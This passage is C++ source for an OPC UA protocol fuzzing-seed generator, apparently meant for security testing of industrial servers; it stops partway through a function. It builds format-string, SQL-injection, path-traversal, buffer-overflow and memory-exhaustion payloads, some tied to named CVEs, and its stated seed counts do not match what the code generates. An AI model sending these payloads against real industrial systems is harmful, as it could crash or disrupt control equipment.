#include "opcua_fuzzing_seeds.h"
#include "../core/logging_system.h"
#include <cstring>

#define TAG_OPCUA_FUZZ "OPCUAFuzz"

namespace OPCUAFuzzingSeeds {

// CVE References database
const char* const SeedDatabase::CVE_REFERENCES[] = {
    "CVE-2019-6575",  // Chunk memory exhaustion
    "CVE-2018-7559",  // Stack buffer overflow in string parsing
    "CVE-2017-12069", // Integer overflow in array length
    "CVE-2017-15396", // Denial of service via malformed message
    "CVE-2018-7551",  // NULL pointer dereference
    "CVE-2019-13585", // Infinite loop in browse service
    "CVE-2020-6069",  // Memory corruption in certificate parsing
    "CVE-2020-10239", // Information disclosure via timing attack
};

const size_t SeedDatabase::CVE_COUNT = sizeof(CVE_REFERENCES) / sizeof(CVE_REFERENCES[0]);

// Constructor / Destructor
SeedGenerator::SeedGenerator() {
}

SeedGenerator::~SeedGenerator() {
}

// Helper: Create seed
FuzzingSeed SeedGenerator::createSeed(SeedCategory category, const char* name,
                                     const char* description, const uint8_t* data,
                                     size_t len, uint32_t expected_behavior,
                                     const char* cve_ref) {
    FuzzingSeed seed;
    seed.category = category;
    seed.name = PSRAMUtils::createPSRAMString(name);
    seed.description = PSRAMUtils::createPSRAMString(description);
    seed.payload.reserve(len);
    for (size_t i = 0; i < len; i++) {
        seed.payload.push_back(data[i]);
    }
    seed.expected_behavior = expected_behavior;
    if (cve_ref) {
        seed.cve_reference = PSRAMUtils::createPSRAMString(cve_ref);
    }
    return seed;
}

// Helper: Build OPC UA message structure
psram_vector<uint8_t> SeedGenerator::buildMessage(const char* msg_type, uint32_t size,
                                                  const uint8_t* payload, size_t payload_len) {
    psram_vector<uint8_t> msg;
    msg.reserve(8 + payload_len);

    // Message type (3 bytes)
    for (int i = 0; i < 3 && msg_type[i]; i++) {
        msg.push_back((uint8_t)msg_type[i]);
    }

    // Chunk type (1 byte)
    msg.push_back('F');  // Final chunk

    // Message size (4 bytes, little endian)
    msg.push_back((uint8_t)(size & 0xFF));
    msg.push_back((uint8_t)((size >> 8) & 0xFF));
    msg.push_back((uint8_t)((size >> 16) & 0xFF));
    msg.push_back((uint8_t)((size >> 24) & 0xFF));

    // Payload
    for (size_t i = 0; i < payload_len; i++) {
        msg.push_back(payload[i]);
    }

    return msg;
}

// Helper: Generate patterns
psram_vector<uint8_t> SeedGenerator::generatePattern(uint8_t byte, size_t count) {
    psram_vector<uint8_t> pattern;
    pattern.reserve(count);
    for (size_t i = 0; i < count; i++) {
        pattern.push_back(byte);
    }
    return pattern;
}

psram_vector<uint8_t> SeedGenerator::generateAlternatingPattern(uint8_t b1, uint8_t b2, size_t count) {
    psram_vector<uint8_t> pattern;
    pattern.reserve(count);
    for (size_t i = 0; i < count; i++) {
        pattern.push_back((i % 2 == 0) ? b1 : b2);
    }
    return pattern;
}

// CATEGORY 1: Malformed Headers (30 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateMalformedHeaders() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(30);

    // Invalid message types
    const char* invalid_types[] = {
        "XXX", "ZZZ", "AAA", "   ", "\x00\x00\x00", "MSG", "HEL", "ACK",
        "ERR", "OPN", "CLO", "123", "!!!", "@@@", "HEX"
    };

    for (size_t i = 0; i < sizeof(invalid_types) / sizeof(invalid_types[0]); i++) {
        uint8_t header[8] = {0};
        memcpy(header, invalid_types[i], 3);
        header[3] = 'F';
        uint32_t size = 8;
        memcpy(&header[4], &size, 4);

        char name[64];
        snprintf(name, sizeof(name), "Invalid message type: %s", invalid_types[i]);
        seeds.push_back(createSeed(SeedCategory::MALFORMED_HEADERS, name,
                                  "Invalid 3-byte message type", header, 8,
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Invalid chunk types
    const uint8_t invalid_chunks[] = {'X', 'Z', 'Q', 0x00, 0xFF, 0x80, ' ', '\n'};
    for (size_t i = 0; i < sizeof(invalid_chunks); i++) {
        uint8_t header[8];
        memcpy(header, "MSG", 3);
        header[3] = invalid_chunks[i];
        uint32_t size = 8;
        memcpy(&header[4], &size, 4);

        char name[64];
        snprintf(name, sizeof(name), "Invalid chunk type: 0x%02X", invalid_chunks[i]);
        seeds.push_back(createSeed(SeedCategory::MALFORMED_HEADERS, name,
                                  "Invalid chunk type byte", header, 8,
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Mismatched sizes
    uint8_t size_mismatch[8];
    memcpy(size_mismatch, "MSGF", 4);
    uint32_t fake_size = 65536;  // Claim 64KB but send only 8 bytes
    memcpy(&size_mismatch[4], &fake_size, 4);
    seeds.push_back(createSeed(SeedCategory::MALFORMED_HEADERS, "Size mismatch (large)",
                              "Message size larger than actual data", size_mismatch, 8,
                              EXPECT_TIMEOUT | EXPECT_HANG));

    // Zero size
    uint8_t zero_size[8];
    memcpy(zero_size, "MSGF", 4);
    uint32_t zs = 0;
    memcpy(&zero_size[4], &zs, 4);
    seeds.push_back(createSeed(SeedCategory::MALFORMED_HEADERS, "Zero message size",
                              "Message size set to 0", zero_size, 8,
                              EXPECT_PROTOCOL_ERROR));

    return seeds;
}

// CATEGORY 2: Boundary Values (40 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateBoundaryValues() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(40);

    // Integer boundary values
    const int32_t int_boundaries[] = {
        0, 1, -1, 127, 128, -128, -129,
        32767, 32768, -32768, -32769,
        2147483647, -2147483648,  // INT32_MAX, INT32_MIN
        0x7FFFFFFF, (int32_t)0x80000000, (int32_t)0xFFFFFFFF
    };

    for (size_t i = 0; i < sizeof(int_boundaries) / sizeof(int_boundaries[0]); i++) {
        // Build message with boundary value as array length
        uint8_t msg[32];
        memcpy(msg, "MSGF", 4);
        uint32_t msg_size = 32;
        memcpy(&msg[4], &msg_size, 4);

        // Array length field at offset 8
        int32_t boundary = int_boundaries[i];
        memcpy(&msg[8], &boundary, 4);

        char name[64];
        snprintf(name, sizeof(name), "Boundary int32: %ld", (long)boundary);
        seeds.push_back(createSeed(SeedCategory::BOUNDARY_VALUES, name,
                                  "Integer boundary value as array length", msg, 32,
                                  EXPECT_CRASH | EXPECT_MEMORY_LEAK, "CVE-2017-12069"));
    }

    // String length boundaries
    const uint32_t str_lengths[] = {
        0, 1, 255, 256, 65535, 65536, 0xFFFFFFF, 0xFFFFFFFF
    };

    for (size_t i = 0; i < sizeof(str_lengths) / sizeof(str_lengths[0]); i++) {
        uint8_t msg[32];
        memcpy(msg, "MSGF", 4);
        uint32_t msg_size = 32;
        memcpy(&msg[4], &msg_size, 4);

        // String length at offset 8
        uint32_t str_len = str_lengths[i];
        memcpy(&msg[8], &str_len, 4);
        // String data would follow but we truncate

        char name[64];
        snprintf(name, sizeof(name), "Boundary string length: %lu", (unsigned long)str_len);
        seeds.push_back(createSeed(SeedCategory::BOUNDARY_VALUES, name,
                                  "String length boundary without data", msg, 32,
                                  EXPECT_CRASH | EXPECT_TIMEOUT, "CVE-2018-7559"));
    }

    // Float/Double special values
    const uint32_t float_special[] = {
        0x7F800000,  // +Infinity
        0xFF800000,  // -Infinity
        0x7FC00000,  // NaN
        0x00000000,  // +0
        0x80000000   // -0
    };

    for (size_t i = 0; i < sizeof(float_special) / sizeof(float_special[0]); i++) {
        uint8_t msg[32];
        memcpy(msg, "MSGF", 4);
        uint32_t msg_size = 32;
        memcpy(&msg[4], &msg_size, 4);
        memcpy(&msg[8], &float_special[i], 4);

        const char* names[] = {"+Inf", "-Inf", "NaN", "+0", "-0"};
        char name[64];
        snprintf(name, sizeof(name), "Float special value: %s", names[i]);
        seeds.push_back(createSeed(SeedCategory::BOUNDARY_VALUES, name,
                                  "Special floating point value", msg, 32,
                                  EXPECT_PROTOCOL_ERROR));
    }

    return seeds;
}

// CATEGORY 3: String Attacks (35 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateStringAttacks() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(35);

    // Format string attacks
    const char* format_strings[] = {
        "%s%s%s%s%s",
        "%x%x%x%x%x",
        "%n%n%n%n%n",
        "%p%p%p%p",
        "%.1000000f",
        "%99999999s",
        "%s" "%s" "%s" "%s"
    };

    for (size_t i = 0; i < sizeof(format_strings) / sizeof(format_strings[0]); i++) {
        size_t str_len = strlen(format_strings[i]);
        size_t msg_size = 8 + 4 + str_len;
        psram_vector<uint8_t> msg;
        msg.reserve(msg_size);

        // Header
        msg.push_back('M'); msg.push_back('S'); msg.push_back('G'); msg.push_back('F');
        uint32_t sz = (uint32_t)msg_size;
        msg.push_back((uint8_t)(sz & 0xFF));
        msg.push_back((uint8_t)((sz >> 8) & 0xFF));
        msg.push_back((uint8_t)((sz >> 16) & 0xFF));
        msg.push_back((uint8_t)((sz >> 24) & 0xFF));

        // String length
        uint32_t slen = (uint32_t)str_len;
        msg.push_back((uint8_t)(slen & 0xFF));
        msg.push_back((uint8_t)((slen >> 8) & 0xFF));
        msg.push_back((uint8_t)((slen >> 16) & 0xFF));
        msg.push_back((uint8_t)((slen >> 24) & 0xFF));

        // String data
        for (size_t j = 0; j < str_len; j++) {
            msg.push_back((uint8_t)format_strings[i][j]);
        }

        char name[64];
        snprintf(name, sizeof(name), "Format string attack %zu", i + 1);
        seeds.push_back(createSeed(SeedCategory::STRING_ATTACKS, name,
                                  "Format string injection attempt", msg.data(), msg.size(),
                                  EXPECT_CRASH));
    }

    // SQL injection patterns (if server logs to database)
    const char* sql_injections[] = {
        "' OR '1'='1",
        "'; DROP TABLE nodes;--",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1"
    };

    for (size_t i = 0; i < sizeof(sql_injections) / sizeof(sql_injections[0]); i++) {
        size_t str_len = strlen(sql_injections[i]);
        psram_vector<uint8_t> payload = buildMessage("MSG", (uint32_t)(8 + 4 + str_len), nullptr, 0);

        // Add string length and data
        uint32_t slen = (uint32_t)str_len;
        payload.push_back((uint8_t)(slen & 0xFF));
        payload.push_back((uint8_t)((slen >> 8) & 0xFF));
        payload.push_back((uint8_t)((slen >> 16) & 0xFF));
        payload.push_back((uint8_t)((slen >> 24) & 0xFF));

        for (size_t j = 0; j < str_len; j++) {
            payload.push_back((uint8_t)sql_injections[i][j]);
        }

        char name[64];
        snprintf(name, sizeof(name), "SQL injection %zu", i + 1);
        seeds.push_back(createSeed(SeedCategory::STRING_ATTACKS, name,
                                  "SQL injection in string field", payload.data(), payload.size(),
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Path traversal
    const char* path_traversals[] = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f",
        "opc.tcp://../../etc/passwd"
    };

    for (size_t i = 0; i < sizeof(path_traversals) / sizeof(path_traversals[0]); i++) {
        size_t str_len = strlen(path_traversals[i]);
        psram_vector<uint8_t> payload = buildMessage("HEL", (uint32_t)(8 + 4 + str_len), nullptr, 0);

        uint32_t slen = (uint32_t)str_len;
        payload.push_back((uint8_t)(slen & 0xFF));
        payload.push_back((uint8_t)((slen >> 8) & 0xFF));
        payload.push_back((uint8_t)((slen >> 16) & 0xFF));
        payload.push_back((uint8_t)((slen >> 24) & 0xFF));

        for (size_t j = 0; j < str_len; j++) {
            payload.push_back((uint8_t)path_traversals[i][j]);
        }

        char name[64];
        snprintf(name, sizeof(name), "Path traversal %zu", i + 1);
        seeds.push_back(createSeed(SeedCategory::STRING_ATTACKS, name,
                                  "Path traversal in endpoint URL", payload.data(), payload.size(),
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Null byte injection
    const char null_injection[] = "admin\x00hidden";
    psram_vector<uint8_t> null_msg = buildMessage("MSG", 8 + 4 + 12, nullptr, 0);
    uint32_t null_len = 12;
    null_msg.push_back((uint8_t)(null_len & 0xFF));
    null_msg.push_back((uint8_t)((null_len >> 8) & 0xFF));
    null_msg.push_back((uint8_t)((null_len >> 16) & 0xFF));
    null_msg.push_back((uint8_t)((null_len >> 24) & 0xFF));
    for (size_t i = 0; i < 12; i++) {
        null_msg.push_back((uint8_t)null_injection[i]);
    }
    seeds.push_back(createSeed(SeedCategory::STRING_ATTACKS, "Null byte injection",
                              "Embedded null byte in string", null_msg.data(), null_msg.size(),
                              EXPECT_PROTOCOL_ERROR));

    // Extremely long strings
    psram_vector<uint8_t> long_str_msg = buildMessage("MSG", 8 + 4, nullptr, 0);
    uint32_t huge_len = 0xFFFFFFFF;
    long_str_msg.push_back((uint8_t)(huge_len & 0xFF));
    long_str_msg.push_back((uint8_t)((huge_len >> 8) & 0xFF));
    long_str_msg.push_back((uint8_t)((huge_len >> 16) & 0xFF));
    long_str_msg.push_back((uint8_t)((huge_len >> 24) & 0xFF));
    seeds.push_back(createSeed(SeedCategory::STRING_ATTACKS, "Max length string",
                              "String length 0xFFFFFFFF without data", long_str_msg.data(),
                              long_str_msg.size(), EXPECT_CRASH | EXPECT_MEMORY_LEAK));

    return seeds;
}

// CATEGORY 4: Protocol Violations (30 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateProtocolViolations() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(30);

    // Send MSG before HEL
    psram_vector<uint8_t> msg_before_hel = buildMessage("MSG", 8, nullptr, 0);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "MSG before HEL",
                              "Send message before handshake", msg_before_hel.data(),
                              msg_before_hel.size(), EXPECT_PROTOCOL_ERROR));

    // Multiple HEL messages
    psram_vector<uint8_t> multi_hel = buildMessage("HEL", 8, nullptr, 0);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "Multiple HEL",
                              "Send multiple Hello messages", multi_hel.data(),
                              multi_hel.size(), EXPECT_PROTOCOL_ERROR));

    // OPN without HEL
    psram_vector<uint8_t> opn_no_hel = buildMessage("OPN", 8, nullptr, 0);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "OPN without HEL",
                              "OpenSecureChannel without Hello", opn_no_hel.data(),
                              opn_no_hel.size(), EXPECT_PROTOCOL_ERROR));

    // CLO without session
    psram_vector<uint8_t> clo_no_session = buildMessage("CLO", 8, nullptr, 0);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "CLO without session",
                              "CloseSecureChannel without open channel", clo_no_session.data(),
                              clo_no_session.size(), EXPECT_PROTOCOL_ERROR));

    // Invalid sequence numbers
    for (uint32_t seq = 0; seq < 5; seq++) {
        uint8_t seq_msg[32];
        memcpy(seq_msg, "MSGF", 4);
        uint32_t sz = 32;
        memcpy(&seq_msg[4], &sz, 4);

        // Sequence number at offset 8
        uint32_t bad_seq = (seq == 0) ? 0xFFFFFFFF : (seq * 1000000);
        memcpy(&seq_msg[8], &bad_seq, 4);

        char name[64];
        snprintf(name, sizeof(name), "Invalid sequence number: %lu", (unsigned long)bad_seq);
        seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, name,
                                  "Out-of-order sequence number", seq_msg, 32,
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Duplicate request IDs
    uint8_t dup_req[32];
    memcpy(dup_req, "MSGF", 4);
    uint32_t sz = 32;
    memcpy(&dup_req[4], &sz, 4);
    uint32_t req_id = 1;
    memcpy(&dup_req[12], &req_id, 4);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "Duplicate request ID",
                              "Reuse same request ID", dup_req, 32,
                              EXPECT_PROTOCOL_ERROR));

    // Invalid timestamps
    const uint64_t bad_timestamps[] = {
        0,                    // Epoch
        0xFFFFFFFFFFFFFFFFULL, // Max
        116444736000000000ULL + 1000000000ULL // Far future
    };

    for (size_t i = 0; i < sizeof(bad_timestamps) / sizeof(bad_timestamps[0]); i++) {
        uint8_t ts_msg[32];
        memcpy(ts_msg, "MSGF", 4);
        uint32_t msg_sz = 32;
        memcpy(&ts_msg[4], &msg_sz, 4);
        memcpy(&ts_msg[16], &bad_timestamps[i], 8);

        const char* names[] = {"Epoch timestamp", "Max timestamp", "Far future timestamp"};
        seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, names[i],
                                  "Invalid timestamp value", ts_msg, 32,
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Mismatched security token IDs
    uint8_t bad_token[32];
    memcpy(bad_token, "MSGF", 4);
    memcpy(&bad_token[4], &sz, 4);
    uint32_t fake_token = 0xDEADBEEF;
    memcpy(&bad_token[24], &fake_token, 4);
    seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, "Invalid security token",
                              "Reference non-existent security token", bad_token, 32,
                              EXPECT_PROTOCOL_ERROR));

    // Invalid NodeId encodings
    for (uint8_t encoding = 0; encoding < 8; encoding++) {
        if (encoding <= 4) continue;  // 0-4 are valid

        uint8_t nodeid_msg[32];
        memcpy(nodeid_msg, "MSGF", 4);
        memcpy(&nodeid_msg[4], &sz, 4);
        nodeid_msg[8] = encoding;  // Invalid encoding type

        char name[64];
        snprintf(name, sizeof(name), "Invalid NodeId encoding: %u", encoding);
        seeds.push_back(createSeed(SeedCategory::PROTOCOL_VIOLATIONS, name,
                                  "Invalid NodeId encoding byte", nodeid_msg, 32,
                                  EXPECT_PROTOCOL_ERROR));
    }

    return seeds;
}

// CATEGORY 5: Resource Exhaustion (25 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateResourceExhaustion() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(25);

    // Chunk flooding (CVE-2019-6575)
    for (uint32_t chunk_size = 1024; chunk_size <= 65536; chunk_size *= 2) {
        uint8_t chunk[16];
        memcpy(chunk, "MSGC", 4);  // Chunk intermediate
        memcpy(&chunk[4], &chunk_size, 4);
        memcpy(&chunk[8], &chunk_size, 4);  // Total size

        char name[64];
        snprintf(name, sizeof(name), "Chunk flooding: %lu bytes", (unsigned long)chunk_size);
        seeds.push_back(createSeed(SeedCategory::RESOURCE_EXHAUSTION, name,
                                  "Send incomplete chunk to trigger memory allocation",
                                  chunk, 16, EXPECT_MEMORY_LEAK | EXPECT_HANG, "CVE-2019-6575"));
    }

    // Deeply nested arrays
    for (uint32_t depth = 10; depth <= 100; depth += 10) {
        psram_vector<uint8_t> nested;
        nested.reserve(8 + depth * 5);

        // Header
        nested.push_back('M'); nested.push_back('S'); nested.push_back('G'); nested.push_back('F');
        uint32_t sz = (uint32_t)(8 + depth * 5);
        nested.push_back((uint8_t)(sz & 0xFF));
        nested.push_back((uint8_t)((sz >> 8) & 0xFF));
        nested.push_back((uint8_t)((sz >> 16) & 0xFF));
        nested.push_back((uint8_t)((sz >> 24) & 0xFF));

        // Nested array markers
        for (uint32_t i = 0; i < depth; i++) {
            nested.push_back(0x15);  // Array type
            uint32_t arr_len = 1;
            nested.push_back((uint8_t)(arr_len & 0xFF));
            nested.push_back((uint8_t)((arr_len >> 8) & 0xFF));
            nested.push_back((uint8_t)((arr_len >> 16) & 0xFF));
            nested.push_back((uint8_t)((arr_len >> 24) & 0xFF));
        }

        char name[64];
        snprintf(name, sizeof(name), "Nested arrays depth: %lu", (unsigned long)depth);
        seeds.push_back(createSeed(SeedCategory::RESOURCE_EXHAUSTION, name,
                                  "Deeply nested array structure", nested.data(), nested.size(),
                                  EXPECT_CRASH | EXPECT_HANG));
    }

    // Huge array allocations
    const uint32_t huge_arrays[] = {
        1000000, 10000000, 100000000, 0x7FFFFFFF
    };

    for (size_t i = 0; i < sizeof(huge_arrays) / sizeof(huge_arrays[0]); i++) {
        uint8_t huge_arr[32];
        memcpy(huge_arr, "MSGF", 4);
        uint32_t sz = 32;
        memcpy(&huge_arr[4], &sz, 4);
        memcpy(&huge_arr[8], &huge_arrays[i], 4);

        char name[64];
        snprintf(name, sizeof(name), "Huge array: %lu elements", (unsigned long)huge_arrays[i]);
        seeds.push_back(createSeed(SeedCategory::RESOURCE_EXHAUSTION, name,
                                  "Request allocation of huge array", huge_arr, 32,
                                  EXPECT_CRASH | EXPECT_MEMORY_LEAK, "CVE-2017-12069"));
    }

    // Massive string table
    uint8_t str_table[32];
    memcpy(str_table, "MSGF", 4);
    uint32_t sz = 32;
    memcpy(&str_table[4], &sz, 4);
    uint32_t str_count = 1000000;
    memcpy(&str_table[8], &str_count, 4);
    seeds.push_back(createSeed(SeedCategory::RESOURCE_EXHAUSTION, "Massive string table",
                              "Request 1M strings in namespace table", str_table, 32,
                              EXPECT_MEMORY_LEAK));

    // Compression bomb patterns
    psram_vector<uint8_t> compress_bomb = generatePattern(0x00, 1024);
    psram_vector<uint8_t> bomb_msg = buildMessage("MSG", (uint32_t)(8 + compress_bomb.size()),
                                                   compress_bomb.data(), compress_bomb.size());
    seeds.push_back(createSeed(SeedCategory::RESOURCE_EXHAUSTION, "Compression bomb",
                              "Highly compressible pattern", bomb_msg.data(), bomb_msg.size(),
                              EXPECT_MEMORY_LEAK));

    return seeds;
}

// CATEGORY 6: Encoding Errors (25 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateEncodingErrors() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(25);

    // Invalid UTF-8 sequences
    const uint8_t invalid_utf8[][4] = {
        {0xC0, 0x80, 0x00, 0x00},       // Overlong encoding of NULL
        {0xE0, 0x80, 0x80, 0x00},       // Overlong 3-byte
        {0xF0, 0x80, 0x80, 0x80},       // Overlong 4-byte
        {0xFF, 0xFF, 0xFF, 0xFF},       // Invalid start bytes
        {0x80, 0x80, 0x80, 0x80},       // Continuation bytes only
        {0xED, 0xA0, 0x80, 0x00},       // UTF-16 surrogate
        {0xC2, 0x00, 0x00, 0x00},       // Incomplete 2-byte
        {0xE0, 0xA0, 0x00, 0x00}        // Incomplete 3-byte
    };

    for (size_t i = 0; i < sizeof(invalid_utf8) / sizeof(invalid_utf8[0]); i++) {
        psram_vector<uint8_t> utf8_msg = buildMessage("MSG", 8 + 4 + 4, nullptr, 0);
        uint32_t str_len = 4;
        utf8_msg.push_back((uint8_t)(str_len & 0xFF));
        utf8_msg.push_back((uint8_t)((str_len >> 8) & 0xFF));
        utf8_msg.push_back((uint8_t)((str_len >> 16) & 0xFF));
        utf8_msg.push_back((uint8_t)((str_len >> 24) & 0xFF));

        for (int j = 0; j < 4; j++) {
            utf8_msg.push_back(invalid_utf8[i][j]);
        }

        char name[64];
        snprintf(name, sizeof(name), "Invalid UTF-8 sequence %zu", i + 1);
        seeds.push_back(createSeed(SeedCategory::ENCODING_ERRORS, name,
                                  "Malformed UTF-8 encoding", utf8_msg.data(), utf8_msg.size(),
                                  EXPECT_PROTOCOL_ERROR));
    }

    // Length mismatches
    for (uint32_t claimed = 10; claimed <= 100; claimed += 10) {
        uint32_t actual = claimed / 2;
        psram_vector<uint8_t> len_mismatch = buildMessage("MSG", 8 + 4 + actual, nullptr, 0);

        // Claim larger length
        len_mismatch.push_back((uint8_t)(claimed & 0xFF));
        len_mismatch.push_back((uint8_t)((claimed >> 8) & 0xFF));
        len_mismatch.push_back((uint8_t)((claimed >> 16) & 0xFF));
        len_mismatch.push_back((uint8_t)((claimed >> 24) & 0xFF));

        // But only provide actual bytes
        for (uint32_t i = 0; i < actual; i++) {
            len_mismatch.push_back('A');
        }

        char name[64];
        snprintf(name, sizeof(name), "Length mismatch: claim %lu provide %lu", (unsigned long)claimed, (unsigned long)actual);
        seeds.push_back(createSeed(SeedCategory::ENCODING_ERRORS, name,
                                  "String length exceeds available data", len_mismatch.data(),
                                  len_mismatch.size(), EXPECT_TIMEOUT | EXPECT_CRASH,
                                  "CVE-2018-7559"));
    }

    // Negative lengths (as signed int32)
    int32_t neg_lengths[] = {-1, -100, -32768, -2147483648};
    for (size_t i = 0; i < sizeof(neg_lengths) / sizeof(neg_lengths[0]); i++) {
        uint8_t neg_len[32];
        memcpy(neg_len, "MSGF", 4);
        uint32_t sz = 32;
        memcpy(&neg_len[4], &sz, 4);
        memcpy(&neg_len[8], &neg_lengths[i], 4);

        char name[64];
        snprintf(name, sizeof(name), "Negative length: %ld", (long)neg_lengths[i]);
        seeds.push_back(createSeed(SeedCategory::ENCODING_ERRORS, name,
                                  "Negative value for length field", neg_len, 32,
                                  EXPECT_CRASH));
    }

    return seeds;
}

// CATEGORY 7: CVE-Based Seeds (20 seeds)
psram_vector<FuzzingSeed> SeedGenerator::generateCVEBasedSeeds() {
    psram_vector<FuzzingSeed> seeds;
    seeds.reserve(20);

    // CVE-2019-6575: Chunk memory exhaustion
    for (int i = 0; i < 3; i++) {
        uint8_t cve_chunk[16];
        memcpy(cve_chunk, "MSGC", 4);  // Intermediate chunk
        uint32_t chunk_sz = 65536;
        memcpy(&cve_chunk[4], &chunk_sz, 4);
        uint32_t total_sz = 0xFFFFFFFF;  // Claim huge total
        memcpy(&cve_chunk[8], &total_sz, 4);

        char name[64];
        snprintf(name, sizeof(name), "CVE-2019-6575 variant %d", i + 1);
        seeds.push_back(createSeed(SeedCategory::CVE_BASED, name,
                                  "Chunk memory exhaustion attack", cve_chunk, 16,
                                  EXPECT_MEMORY_LEAK | EXPECT_HANG, "CVE-2019-6575"));
    }

    // CVE-2018-7559: Stack buffer overflow
    for (int i = 0; i < 3; i++) {
        uint32_t overflow_len = 1024 + (i * 512);
        psram_vector<uint8_t> overflow = buildMessage("MSG", 8 + 4 + overflow_len, nullptr, 0);

        overflow.push_back((uint8_t)(overflow_len & 0xFF));
        overflow.push_back((uint8_t)((overflow_len >> 8) & 0xFF));
        overflow.push_back((uint8_t)((overflow_len >> 16) & 0xFF));
        overflow.push_back((uint8_t)((overflow_len >> 24) & 0xFF));

        for (uint32_t j = 0; j < overflow_len; j++) {
            overflow.push_back((uint8_t)('A' + (j % 26)));
        }

        char name[64];
        snprintf(name, sizeof(name), "CVE-2018-7559: overflow %lu bytes", (unsigned long)overflow_len);
        seeds.push_back(createSeed(SeedCategory::CVE_BASED, name,
                                  "Stack buffer overflow in string parsing", overflow.data(),
                                  overflow.size(), EXPECT_CRASH, "CVE-2018-7559"));
    }

    // CVE-2017-15396: Malformed message DoS
    for (int i = 0; i < 3; i++) {
        uint8_t malformed[64];
        memset(malformed, 0xFF, sizeof(malformed));
        memcpy(malformed, "MSG", 3);
        malformed[3] = 'F';
        uint32_t sz = 64;
        memcpy(&malformed[4], &sz, 4);

        char name[64];
        snprintf(name, sizeof(name), "CVE-2017-15396 variant %d", i + 1);
        seeds.push_back(createSeed(SeedCategory::CVE_BASED, name,
                                  "Malformed message causing DoS", malformed, 64,
                                  EXPECT_CRASH | EXPECT_HANG, "CVE-2017-15396"));
    }

    // CVE-2018-7551: NULL pointer dereference
    uint8_t null_ptr[32];
    memcpy(null_ptr, "MSGF", 4);
    uint32_t sz = 32;
    memcpy(&null_ptr[4], &sz, 4);
    memset(&null_ptr[8], 0, 24);  // All zeros
    seeds.push_back(createSeed(SeedCategory::CVE_BASED, "CVE-2018-7551",
                              "NULL pointer dereference trigger", null_ptr, 32,
                              EXPECT_CRASH, "CVE-2018-7551"));

    // Additional CVE variants
    for (int i = 0; i < 8; i++) {
        psram_vector<uint8_t> generic = generatePattern((uint8_t)(0x90 + i), 128);
        psram_vector<uint8_t> cve_msg = buildMessage("MSG", (uint32_t)(8 + generic.size()),
                                                      generic.data(), generic.size());

        char name[64];
        snprintf(name, sizeof(name), "Generic CVE pattern %d", i + 1);
        seeds.push_back(createSeed(SeedCategory::CVE_BASED, name,
                                  "Pattern based on historical CVEs", cve_msg.data(),
                                  cve_msg.size(), EXPECT_PROTOCOL_ERROR));
    }

    return seeds;
}

// Generate all seeds
psram_vector<FuzzingSeed> SeedGenerator::generateAllSeeds() {
    psram_vector<FuzzingSeed> all_seeds;
    all_seeds.reserve(205);  // Approximate total

    LOG_INFO(TAG_OPCUA_FUZZ, "Generating fuzzing seeds...");

    auto cat1 = generateMalformedHeaders();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 1 (Malformed Headers): %zu seeds", cat1.size());
    all_seeds.insert(all_seeds.end(), cat1.begin(), cat1.end());

    auto cat2 = generateBoundaryValues();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 2 (Boundary Values): %zu seeds", cat2.size());
    all_seeds.insert(all_seeds.end(), cat2.begin(), cat2.end());

    auto cat3 = generateStringAttacks();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 3 (String Attacks): %zu seeds", cat3.size());
    all_seeds.insert(all_seeds.end(), cat3.begin(), cat3.end());

    auto cat4 = generateProtocolViolations();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 4 (Protocol Violations): %zu seeds", cat4.size());
    all_seeds.insert(all_seeds.end(), cat4.begin(), cat4.end());

    auto cat5 = generateResourceExhaustion();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 5 (Resource Exhaustion): %zu seeds", cat5.size());
    all_seeds.insert(all_seeds.end(), cat5.begin(), cat5.end());

    auto cat6 = generateEncodingErrors();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 6 (Encoding Errors): %zu seeds", cat6.size());
    all_seeds.insert(all_seeds.end(), cat6.begin(), cat6.end());

    auto cat7 = generateCVEBasedSeeds();
    LOG_INFOF(TAG_OPCUA_FUZZ, "  Category 7 (CVE-Based): %zu seeds", cat7.size());
    all_seeds.insert(all_seeds.end(), cat7.begin(), cat7.end());

    LOG_INFOF(TAG_OPCUA_FUZZ, "Total seeds generated: %zu", all_seeds.size());

    return all_seeds;
}

size_t SeedGenerator::getSeedCount(SeedCategory category) {
    switch (category) {
        case SeedCategory::MALFORMED_HEADERS: return 30;
        case SeedCategory::BOUNDARY_VALUES: return 40;
        case SeedCategory::STRING_ATTACKS: return 35;
        case SeedCategory::PROTOCOL_VIOLATIONS: return 30;
        case SeedCategory::RESOURCE_EXHAUSTION: return 25;
        case SeedCategory::ENCODING_ERRORS: return 25;
